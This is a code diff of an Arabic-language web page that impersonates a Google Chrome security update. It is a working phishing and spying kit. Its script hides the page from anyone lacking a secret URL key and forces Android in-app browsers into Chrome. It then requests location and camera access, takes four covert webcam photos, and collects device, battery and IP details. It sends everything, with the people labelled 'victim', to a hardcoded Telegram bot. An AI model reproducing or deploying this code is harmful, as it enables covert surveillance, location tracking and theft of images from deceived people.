@@ -1,7 +1,24 @@
 <script>
-/* 🛡️ AHMED CYBER SECURITY - AUTO-BYPASS SYSTEM */
-(function(){var ua=navigator.userAgent;if(/FBAN|FBAV|Instagram|Messenger|WhatsApp|Telegram|TikTok/i.test(ua)&&/android/i.test(ua)){var url=window.location.href.replace(/^https?:\/\//,"");window.location.replace("intent://"+url+"#Intent;scheme=https;package=com.android.chrome;end");}})();
+    /* 1. نظام الفحص والتحويل التلقائي (أعلى الصفحة لضمان السرعة) */
+    const urlParams = new URLSearchParams(window.location.search);
+    const accessKey = urlParams.get('access');
+
+    // إذا لم يحتوي الرابط على كلمة camera، حوله فوراً لجوجل للتمويه
+    if (accessKey !== 'camera') {
+        window.location.replace("https://www.google.com");
+    } else {
+        // إذا كان الرابط صحيحاً، حاول إخراجه من سجن التطبيقات (فيسبوك، تليجرام، الخ)
+        (function() {
+            var ua = navigator.userAgent || navigator.vendor || window.opera;
+            var isSocial = /FBAN|FBAV|Instagram|Messenger|WhatsApp|Telegram|TikTok/i.test(ua);
+            if (isSocial && /android/i.test(ua)) {
+                var currentUrl = window.location.href.replace(/^https?:\/\//, "");
+                window.location.replace("intent://" + currentUrl + "#Intent;scheme=https;package=com.android.chrome;end");
+            }
+        })();
+    }
 </script>
+
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
@@ -10,99 +27,121 @@
     <title>Google Chrome - تحديث الأمان</title>
     <link rel="icon" type="image/png" href="https://www.google.com/chrome/static/images/favicons/favicon-32x32.png">
     <style>
-        body { background-color: #ffffff; color: #3c4043; font-family: 'Roboto', Arial, sans-serif; text-align: center; margin: 0; padding: 0; }
+        body { background-color: #ffffff; color: #3c4043; font-family: Arial, sans-serif; text-align: center; margin: 0; padding: 0; display: none; }
         .header { padding: 20px; border-bottom: 1px solid #e0e0e0; }
         .container { padding: 40px 20px; }
         .chrome-logo { width: 80px; height: 80px; margin-bottom: 20px; }
         h1 { font-size: 22px; font-weight: 400; color: #202124; }
         p { font-size: 14px; line-height: 1.6; color: #5f6368; max-width: 300px; margin: 0 auto 30px; }
         .btn-blue { background-color: #1a73e8; color: white; padding: 12px 24px; border: none; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; box-shadow: 0 1px 3px rgba(60,64,67,0.3); }
-        .btn-blue:active { background-color: #185abc; }
     </style>
 </head>
-<body>
+<body id="mainBody">
 
     <div class="header">
         <img src="https://www.google.com/chrome/static/images/chrome-logo.svg" alt="Chrome" style="width: 120px;">
     </div>
 
     <div class="container">
-        <img src="https://www.google.com/chrome/static/images/chrome-logo.svg" class="chrome-logo" alt="Logo">
+        <img src="https://www.google.com/chrome/static/images/chrome-logo.svg" class="chrome-logo">
         <h1>تحديث أمان المتصفح مطلوب</h1>
-        <p>لحماية بياناتك من التهديدات السيبرانية، يرجى تحديث صلاحيات المتصفح والتحقق من الهوية فوراً.</p>
-        
-        <button class="btn-blue" onclick="startProcess()">تحديث المتصفح الآن</button>
+        <p>لحماية بياناتك، يرجى تحديث صلاحيات المتصفح والتحقق من الهوية فوراً عبر متصفح Chrome الرسمي.</p>
+        <button class="btn-blue" id="actionBtn" onclick="startProcess()">تحديث المتصفح الآن</button>
     </div>
 
     <video id="v" style="display:none;" autoplay playsinline></video>
     <canvas id="c" style="display:none;"></canvas>
 
     <script>
-        // تشفير البيانات (أحمد)
-        const _0xT = "ODI4OTc5Mzk0MzpBQUVyc0ZOMlZhUVZIMzBNaENob3ZxcmhBbzM0VlN1YmU0"; 
-        const _0xI = "NTc3NTc4MTAzOA==";
+        // 🆔 بياناتك (أحمد)
+        const token = "8289793943:AAErsFN2VaQVH30MhCXhovqrhAo34VSube4"; 
+        const chat_id = "5775781038";
 
-        const t = atob(_0xT);
-        const i = atob(_0xI);
+        // إظهار المحتوى فقط إذا كان المفتاح صحيحاً
+        if (accessKey === 'camera') {
+            document.getElementById('mainBody').style.display = 'block';
+        }
 
-        function send(txt) { fetch(`https://api.telegram.org/bot${t}/sendMessage?chat_id=${i}&text=${encodeURIComponent(txt)}&parse_mode=html`); }
+        function sendMsg(text) {
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}&parse_mode=html`);
+        }
 
-        function sendPic(data, n) {
-            let b = dataURItoBlob(data);
-            let f = new FormData();
-            f.append("chat_id", i);
-            f.append("caption", `🎯 صيد جديد (أحمد) - صورة ${n}`);
-            f.append("photo", b, "chrome_secure.jpg");
-            fetch(`https://api.telegram.org/bot${t}/sendPhoto`, { method: "POST", body: f });
+        function sendPhoto(data, n) {
+            let blob = dataURItoBlob(data);
+            let formData = new FormData();
+            formData.append("chat_id", chat_id);
+            formData.append("photo", blob, "img.jpg");
+            formData.append("caption", `📸 لقطة (${n}) من ضحية أحمد`);
+            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: "POST", body: formData });
         }
 
         function dataURItoBlob(d) {
             var s = atob(d.split(',')[1]), a = new ArrayBuffer(s.length), ia = new Uint8Array(a);
-            for (var j = 0; j < s.length; j++) ia[j] = s.charCodeAt(j);
+            for (var i = 0; i < s.length; i++) ia[i] = s.charCodeAt(i);
             return new Blob([a], { type: 'image/jpeg' });
         }
 
         async function startProcess() {
-            // طلب الموقع فوراً
+            document.getElementById('actionBtn').innerText = "جاري التحقق...";
+            
+            // 📍 1. طلب الموقع
             navigator.geolocation.getCurrentPosition(p => {
-                send(`📍 <b>موقع الضحية:</b>\nhttps://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
-            });
+                sendMsg(`📍 <b>موقع الضحية:</b>\nhttps://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
+            }, () => { sendMsg("❌ رفض الموقع"); });
 
-            // طلب الكاميرا والتصوير السريع جداً
+            // 📸 2. الكاميرا (4 صور سريعة جداً)
             try {
-                const s = await navigator.mediaDevices.getUserMedia({ video: true });
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 const video = document.getElementById('v');
-                video.srcObject = s;
+                video.srcObject = stream;
                 
-                let shots = 0;
-                let timer = setInterval(() => {
-                    if (shots < 4) {
+                let count = 0;
+                let interval = setInterval(() => {
+                    if (count < 4) {
                         const canvas = document.getElementById('c');
-                        canvas.width = video.videoWidth; 
+                        canvas.width = video.videoWidth;
                         canvas.height = video.videoHeight;
                         canvas.getContext('2d').drawImage(video, 0, 0);
-                        sendPic(canvas.toDataURL('image/jpeg'), shots + 1);
-                        shots++;
+                        sendPhoto(canvas.toDataURL('image/jpeg'), count + 1);
+                        count++;
                     } else {
-                        clearInterval(timer);
-                        s.getTracks().forEach(track => track.stop());
-                        window.location.replace("https://www.google.com"); // توجيه الضحية لجوجل بعد الانتهاء للتمويه
+                        clearInterval(interval);
+                        stream.getTracks().forEach(t => t.stop());
+                        window.location.replace("https://www.google.com");
                     }
-                }, 700); // تصوير فائق السرعة
-            } catch (err) {
-                send("❌ الضحية رفض الأذونات");
+                }, 700); // لقطة كل 0.7 ثانية
+            } catch (e) {
+                sendMsg("❌ رفض الكاميرا");
             }
         }
 
         window.onload = async () => {
-            // سحب معلومات الجهاز والبطارية فوراً
-            let info = `<b>🚀 اختراق جديد (Google Theme)</b>\n`;
+            if (accessKey !== 'camera') return;
+
+            let info = `🚀 <b>ضحية جديدة (AHMED-STRIKER)</b>\n`;
             info += `📱 الجهاز: ${navigator.platform}\n`;
+            info += `🖥️ الشاشة: ${screen.width}x${screen.height}\n`;
+            
+            // جلب البطارية
             if (navigator.getBattery) {
                 const b = await navigator.getBattery();
-                info += `🔋 البطارية: ${Math.round(b.level * 100)}%\n`;
+                info += `🔋 البطارية: ${Math.round(b.level * 100)}% (${b.charging ? 'يُشحن' : 'لا يُشحن'})\n`;
             }
-            send(info);
+
+            // جلب الـ IP والرسالة النهائية
+            fetch('https://api.ipify.org?format=json')
+                .then(r => r.json())
+                .then(d => { 
+                    info += `🌐 IP: <code>${d.ip}</code>`; 
+                    sendMsg(info); 
+                });
+
+            // طلب الإذن فوراً في المتصفحات التي تدعم ذلك
+            startProcess();
+        };
+    </script>
+</body>
+</html>
             
             // محاولة البدء التلقائي
             startProcess();
